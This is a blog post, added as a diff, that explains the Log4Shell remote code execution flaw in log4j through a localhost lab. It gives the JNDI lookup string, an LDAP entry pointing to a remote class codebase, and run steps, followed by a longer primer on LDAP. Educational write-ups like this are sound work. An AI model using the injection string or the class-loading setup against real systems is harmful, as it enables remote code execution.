@@ -1,0 +1,92 @@
+---
+layout: post
+title:  "Log4Shell"
+permalink: /log4shell/
+tags: java jndi ldap security log4shell log4j
+---
+
+A demonstration of how the "log4shell" remote code execution vulnerability in log4j.
+
+<!--more-->
+
+My [log4shell](https://github.com/ToastNumber/log4shell) repo contains code to demonstrate this **for educational purposes only**. Read more here: [https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/) and here [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+
+
+## How it works
+
+* [`DoJndiLookup`](https://github.com/ToastNumber/log4shell/blob/master/src/main/java/com/kelseymckenna/ldap/DoJndiLookup.java) executes the following statement:
+    ```
+    LOGGER.info("${jndi:ldap://localhost/cn=log4shell,dc=example,dc=com}");
+    ```
+* Log4J makes a request to the LDAP server ("localhost" here just for testing) with the filter/query `cn=log4shell,dc=example,dc=com`
+* The server returns something like this:
+    ```
+    dn: cn=log4shell,dc=example,dc=com
+    objectClass: javaContainer
+    objectClass: javaNamingReference
+    cn: log4shell
+    javaClassName: foo
+    javaFactory: Log4Shell
+    javaCodebase: http://localhost:8000
+    ```
+* It makes a request to the file server (in this case just a Python3 "http.server") at `http://localhost:8000/Log4Shell.class`. It determined the URI using the `javaCodebase` and `javaFactory` attributes.
+* The `Log4Shell` class implements `javax.naming.spi.ObjectFactory`. The return value from its `getObjectInstance` method is what gets logged in `DoJndiLookup`. The `getObjectInstance` method can have arbitrary code.
+
+
+## How to run
+
+1. Install the prerequisites. Adjust the command for your OS.
+    ```
+    sudo yum install gcc java-1.8.0-openjdk-devel maven -y
+    ```
+2. Run `make customize-config` OR build an image from the Dockerfile, e.g. `docker build . -t local/log4shell` then run it, e.g `docker run -it local/log4shell sh`.
+3. Run
+    ```
+    make start-slapd
+    make add-log4shell-entry
+    ./ldap/search.sh "cn=log4shell,dc=example,dc=com"
+    make start-http-server
+    make run-exploit # You should see "WARNING: This is an arbitrary command run from Log4Shell.java!" in the logs.
+    ```
+
+## LDAP
+
+I'll cover the main things I learned. Don't take this as gospel.
+
+LDAP: lightweight directory access protocol.
+
+A "directory" is a **hierarchical database**. For example, you could have an employee in that directory called Joe who works in the Engineering department at Example Company. He would be identified by a **distinguished name** (dn) of `cn=joe,ou=engineering,dc=example,dc=com`; in English that would be "Common Name: Joe, Organizational Unit: Engineering, Company: example.com" (dc means "domain component"). The entries can have attributes too, see below.
+
+You can add entries to the database with the `ldapadd` command, specifying a `ldif` (LDAP Data Interchange Format) file to load the entries from. Entries are separated by empty lines in `ldif` files that look like this:
+```
+dn: c=US,dc=example,dc=com
+objectclass: country
+c: US
+
+# other entries ...
+
+dn: cn=Joe Bloggs,ou=Engineering,c=US,dc=example,dc=com
+objectclass: organizationalPerson
+cn: Joe Bloggs
+sn: Bloggs
+title: Vice President
+```
+
+In this repo I made my organization "example.com", i.e. `dc=example,dc.com`. This means all entries in the database are **descendants** of this entry. For example, I can't add an entry with a distinguished name of `cn=123`, it would need to be `cn=123,dc=example,dc=com`.
+
+Each entry has an **`objectclass`** attribute that determines the **schema** of the entry (see [RFC2256](https://datatracker.ietf.org/doc/html/rfc2256)). For example, there's a built-in `country` object class that has a schema with a mandatory `c` attribute (the two-letter ISO 3166 country code) and some optional attributes. You have to put the mandatory attributes in the distinguished name; the example entry above for US must have a dn of `c=US,dc=example,dc=com`; it couldn't have a dn of `c=GB,dc=example,dc=com` or `x=US,dc=example,dc=com` or `x=1,c=US,dc=example,dc=com`.
+
+Object classes have a **type hierarchy** with the abstract class `top` at the top. You can specify multiple object class attributes for an entry. You'll see in [`log4shell.ldif`](https://github.com/ToastNumber/log4shell/blob/master/ldap/log4shell.ldif) two object classes: `javaContainer` and `javaNamingReference`. The latter object class is the important one - it has the attributes we need for the exploit - but it is an "auxiliary" object class and its parent `javaObject` is an abstract class, so we specify `javaContainer` to give it a concrete ("structural" in LDAP terms) type.
+
+You can **search** the directory like a database too. E.g. to lookup the entry for the US by ID/distinguished name you can run `ldapsearch -x -s base -b 'c=US,dc=example,dc=com'`. Or if you want to list all entries "under" US, e.g. show all departments and employees in US, then you could change `-s base` to `-s sub`. You can filter by the attributes too.
+
+I used **[OpenLDAP](https://www.openldap.org/)** to get a stand-alone LDAP daemon called **slapd**. The Makefile customizes the database to use "example.com" as the root domain instead of "my-domain.com" and adds an "include" to import the java schema in addition to the core schema. 
+
+In order to **modify** the database we have an admin user with the distinguished name `cn=Manager,dc=example,dc=com`. The admin user and password were configured when we originally created the database with `/usr/local/etc/openldap/slapd.ldif`. When you execute commands you can specify the password inline with `-w <password>` and specify the admin user's dn with `-D <dn>`. E.g. `ldapadd -w secret -D "cn=Manager,dc=example,dc=com" -f ldap/log4shell.ldif` will add the entries in `log4shell.ldif` to the database. The default configuration allows **read-only access to all users**.
+
+
+## Notes
+
+* Fun fact: AWS EC2 instances have a process running that automatically patches vulnerable applications! If you run `ps -ef | grep log4j-cve` you'll see `/usr/bin/log4j-cve-2021-44228-hotpatch` is running. This means JNDI lookups will print `Patched JndiLookup::lookup()` instead. Read more here: https://aws.amazon.com/blogs/opensource/hotpatch-for-apache-log4j/
+    * The [`ldap/`](https://github.com/ToastNumber/log4shell/tree/master/ldap) folder has some helper scripts for querying slapd (the LDAP directory server)
+
